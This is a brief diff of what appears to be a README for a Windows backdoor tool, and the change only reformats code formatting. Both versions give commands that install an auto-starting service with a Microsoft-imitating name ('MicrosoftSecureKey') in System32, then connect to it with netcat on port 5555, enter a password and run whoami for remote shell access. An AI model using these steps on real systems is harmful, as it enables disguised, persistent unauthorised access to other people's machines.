@@ -20,10 +20,10 @@ Compilation :
 
 Installation :
 
-`sc create MicrosoftSecureKey binPath="C:\Windows\System32\MicrosoftSecureKey.exe" start=auto
-sc start MicrosoftSecureKey`
+`sc create MicrosoftSecureKey binPath="C:\Windows\System32\MicrosoftSecureKey.exe" start=auto`
+`sc start MicrosoftSecureKey`
 
 Command :
-`nc IP_SRV 5555
-Tape Password
-whoami`
+`nc IP_SRV 5555`
+`Enter Password`
+`whoami`
